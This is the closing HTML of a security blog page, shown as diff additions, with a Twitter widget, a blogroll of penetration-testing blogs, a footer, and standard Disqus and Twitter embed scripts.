+  <ul id="tweets">
+    <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/chous3nsha" data-widget-id="733738822597550081" data-link-color="#1863a1" data-tweet-limit="3" data-chrome="noheader nofooter transparent noscrollbar">Tweets by @chous3nsha</a>
+    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+  </ul>
+  
+    <a href="http://twitter.com/chous3nsha" class="twitter-follow-button" data-show-count="true">Follow @chous3nsha</a>
+  
+</section>
+
+<section>
+  <h1>Blogroll</h1>
+  <p><a href="https://blog.g0tmi1k.com/">g0tmi1k</a></p>
+  <p><a href="http://redteamjournal.com/">Red Team Journal</a></p>
+  <p><a href="https://www.corelan.be/">Corelan Team</a></p>
+  <p><a href="http://www.madirish.net/">Mad Irish</a></p>
+  <p><a href="http://redteams.net/blog/">redteams.net</a></p>
+  <p><a href="https://www.mattandreko.com/">MattAndreko.com</a></p>
+  <p><a href="http://blog.portswigger.net/">Portswigger Web Security</a></p>
+  <p><a href="http://blog.cobaltstrike.com/">Cobalt Strike blog</a></p>
+  <p><a href="https://highon.coffee/blog/">HighOn.Coffee</a></p>
+  <p><a href="https://pentestlab.blog/">Penetration Testing Lab</a></p
+</section>
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2018 - chousensha -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'coredumpoverflow';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://chousensha.github.io/blog/2018/11/16/hackfest-2016-sedna/';
+        var disqus_url = 'http://chousensha.github.io/blog/2018/11/16/hackfest-2016-sedna/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
